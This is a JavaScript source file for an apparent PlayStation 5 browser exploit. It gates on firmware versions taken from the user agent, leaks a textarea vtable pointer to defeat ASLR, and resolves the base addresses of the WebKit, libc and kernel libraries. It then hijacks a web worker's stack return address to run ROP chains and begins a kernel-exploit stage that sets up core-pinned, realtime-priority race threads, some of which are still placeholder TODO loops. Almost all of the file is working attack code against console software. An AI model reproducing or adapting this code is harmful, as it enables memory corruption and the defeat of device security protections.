//Common chain
let chain;
//Bases
let libSceNKWebKitBase;
let libSceLibcInternalBase;
let libKernelBase;
//ASLR defeat patsy (former vtable buddy)
let textArea = document.createElement("textarea");

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["2.00", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
const fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);
document.getElementById("current-fw").innerHTML = "Current firmware: " + fw_str;

//load offsets & webkit exploit after.
if (!supportedFirmwares.includes(fw_str)) {
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];
let syscalls = {};
let gadgets = {};


let worker = new Worker("rop_slave.js");

//Make sure worker is alive?
async function wait_for_worker() {
    let p1 = await new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {
            channel.port1.close();
            resolve(1);
        }
        worker.postMessage(0, [channel.port2]);
    });
    return p1;
}

function find_worker() {

    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    alert("failed to find worker.");
}

function print(string) {
    document.getElementById("console").innerHTML += string + "\n";
}

async function userland() {
    p.pre_chain = pre_chain;
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc_dump = malloc_dump;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;
    p.writestr = writestr;

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    //debug_log("webkit base: 0x" + libSceNKWebKitBase);

    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    //debug_log("libkernel base: 0x" + libKernelBase);

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(0x10000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x10000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint32Array(0x1000);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function u8array_from_address(addr, size) {
        let og_array = new Uint8Array(0x10000 + size);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        nogc.push(bufView);
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr) {
        let str = "";
        for (let i = 0; ; i++) {
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    await wait_for_worker();
    let worker_stack = find_worker();
    let original_context = p.malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {
            alert("The rop thread ran away. ");
            p.write8(0, 0);
        }
    }

    function debug_bin(bin)
    {
        let xhr = new XMLHttpRequest();
        xhr.open('POST', 'a.bin', false);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.send(bin);
    }

    chain = new worker_rop();

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // KERNEL EXPLOIT BEGINS
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    async function pin_to_core(core)
    {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        let SYS_CPUSET_SETAFFINITY = 0x1E8;
        return await chain.syscall(SYS_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    function thread_pin_to_core(thread, core)
    {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        let SYS_CPUSET_SETAFFINITY = 0x1E8;
        thread.self_healing_syscall(SYS_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    async function set_rtprio(prio)
    {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);
        let SYS_RTPRIO_THREAD = 0x1D2;
        let rv = await chain.syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
        debug_log("rtprio rv = " + rv);
        return rv;
    }

    async function thread_set_rtprio(thread, prio)
    {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);
        let SYS_RTPRIO_THREAD = 0x1D2;
        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }

    /*
     * Thread setup:
     * 11 - main thread
     * 13 - destroyer 0
     * 14 - destroyer 1
     * 15 - lookup
     */

    // Pin main thread to core 1
    await pin_to_core(11);
    await set_rtprio(256);
    debug_log("[+] main thread on cpu " + await chain.call(libKernelBase.add32(0x2C20))); // sceKernelGetCurrentCpu

    let thread_data_destroyer_0_run = p.malloc(0x8);
    let thread_data_destroyer_0_stop = p.malloc(0x8);
    let thread_data_destroyer_0_counter = p.malloc(0x8);
    let thread_data_destroyer_0_cpu = p.malloc(0x8);
    let thread_data_destroyer_1_run = p.malloc(0x8);
    let thread_data_destroyer_1_stop = p.malloc(0x8);
    let thread_data_destroyer_1_counter = p.malloc(0x8);
    let thread_data_destroyer_1_cpu = p.malloc(0x8);
    let thread_data_lookup_run = p.malloc(0x8);
    let thread_data_lookup_stop = p.malloc(0x8);
    let thread_data_lookup_counter = p.malloc(0x8);
    let thread_data_lookup_cpu = p.malloc(0x8);

    p.write8(thread_data_destroyer_0_counter, 0x1000);
    p.write8(thread_data_destroyer_1_counter, 0x2000);
    p.write8(thread_data_lookup_counter, 0x3000);

    let thread_destroyer_0 = new thread_rop("rop_thread_destroyer0"); {
        // Pin to core 13
        thread_pin_to_core(thread_destroyer_0, 13);
        thread_set_rtprio(thread_destroyer_0, 256);
        thread_destroyer_0.fcall(libKernelBase.add32(0x2C20));
        thread_destroyer_0.write_result(thread_data_destroyer_0_cpu);

        // Labels/code
        const label_a   = thread_destroyer_0.get_rsp();
        const cond_stop = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_destroyer_0_stop, 1);

        const label_b   = thread_destroyer_0.get_rsp();
        const cond_run  = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_destroyer_0_run, 1);

        const label_c   = thread_destroyer_0.get_rsp();
        // TODO: replace increment with actual op
        thread_destroyer_0.increment_dword(thread_data_destroyer_0_counter);
        thread_destroyer_0.push_write8(thread_data_destroyer_0_run, 0);
        thread_destroyer_0.jmp_to_rsp(label_a);

        const label_d   = thread_destroyer_0.get_rsp();

        // Set branch points
        thread_destroyer_0.set_branch_points(cond_stop, label_d, label_b);
        thread_destroyer_0.set_branch_points(cond_run, label_c, label_a);
    }

    let thread_destroyer_1 = new thread_rop("rop_thread_destroyer1"); {
        // Pin to core 14
        thread_pin_to_core(thread_destroyer_1, 14);
        thread_set_rtprio(thread_destroyer_1, 256);
        thread_destroyer_1.fcall(libKernelBase.add32(0x2C20));
        thread_destroyer_1.write_result(thread_data_destroyer_1_cpu);

        // Labels/code
        const label_a   = thread_destroyer_1.get_rsp();
        const cond_stop = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_destroyer_1_stop, 1);

        const label_b   = thread_destroyer_1.get_rsp();
        const cond_run  = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_destroyer_1_run, 1);

        const label_c   = thread_destroyer_1.get_rsp();
        // TODO: replace increment with actual op
        thread_destroyer_1.increment_dword(thread_data_destroyer_1_counter);
        thread_destroyer_1.push_write8(thread_data_destroyer_1_run, 0);
        thread_destroyer_1.jmp_to_rsp(label_a);

        const label_d   = thread_destroyer_1.get_rsp();

        // Set branch points
        thread_destroyer_1.set_branch_points(cond_stop, label_d, label_b);
        thread_destroyer_1.set_branch_points(cond_run, label_c, label_a);
    }

    let thread_lookup = new thread_rop("rop_thread_lookup"); {
        // Pin to core 15
        thread_pin_to_core(thread_lookup, 15);
        thread_set_rtprio(thread_lookup, 767);
        thread_lookup.fcall(libKernelBase.add32(0x2C20));
        thread_lookup.write_result(thread_data_lookup_cpu);

        // Labels/code
        const label_a   = thread_lookup.get_rsp();
        const cond_stop = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_lookup_stop, 1);

        const label_b   = thread_lookup.get_rsp();
        const cond_run  = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_lookup_run, 1);

        const label_c   = thread_lookup.get_rsp();
        // TODO: replace increment with actual op
        thread_lookup.increment_dword(thread_data_lookup_counter);
        thread_lookup.push_write8(thread_data_lookup_run, 0);
        thread_lookup.jmp_to_rsp(label_a);

        const label_d   = thread_lookup.get_rsp();

        // Set branch points
        thread_lookup.set_branch_points(cond_stop, label_d, label_b);
        thread_lookup.set_branch_points(cond_run, label_c, label_a);
    }

    var pthread_destroyer_0 = await thread_destroyer_0.spawn_thread();
    var pthread_destroyer_1 = await thread_destroyer_1.spawn_thread();
    var pthread_lookup = await thread_lookup.spawn_thread();
    await chain.call(libKernelBase.add32(0x22130), 1); // sleep 1s

    debug_log("[+] destroyer 0 thread on cpu " + p.read8(thread_data_destroyer_0_cpu) + " (waiting)");
    debug_log("[+] destroyer 1 thread on cpu " + p.read8(thread_data_destroyer_1_cpu) + " (waiting)");
    debug_log("[+] lookup      thread on cpu " + p.read8(thread_data_lookup_cpu) + " (waiting)");

    // now counter should still be zero, thread should be stuck at "waiting"
    await chain.call(libKernelBase.add32(0x22130), 2); // sleep
    debug_log("[+] destroyer 0 pre-run counter: " + p.read8(thread_data_destroyer_0_counter));
    debug_log("[+] destroyer 1 pre-run counter: " + p.read8(thread_data_destroyer_1_counter));
    debug_log("[+] lookup      pre-run counter: " + p.read8(thread_data_lookup_counter));

    debug_log("[+] running threads 5 times...");

    for (var i = 0; i < 5; i++) {
        p.write8(thread_data_destroyer_0_run, 1);
        p.write8(thread_data_destroyer_1_run, 1);
        p.write8(thread_data_lookup_run, 1);

        await chain.call(libKernelBase.add32(0x22130), 1); // sleep

        debug_log("  [+] i = " + i + " | destroyer 0 (" + p.read8(thread_data_destroyer_0_counter) + "), destroyer 1 (" + p.read8(thread_data_destroyer_1_counter) + "), lookup (" + p.read8(thread_data_lookup_counter) + ")");
    }

    p.write8(thread_data_destroyer_0_stop, 1);
    p.write8(thread_data_destroyer_1_stop, 1);
    p.write8(thread_data_lookup_stop, 1);

    await chain.call(libKernelBase.add32(0x22130), 2); // sleep
    debug_log("[+] destroyer 0 counter: " + p.read8(thread_data_destroyer_0_counter));
    debug_log("[+] destroyer 1 counter: " + p.read8(thread_data_destroyer_1_counter));
    debug_log("[+] lookup      counter: " + p.read8(thread_data_lookup_counter));
}

async function run_hax() {
    await userland();
}


let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `offsets/${fw_str}.js`);
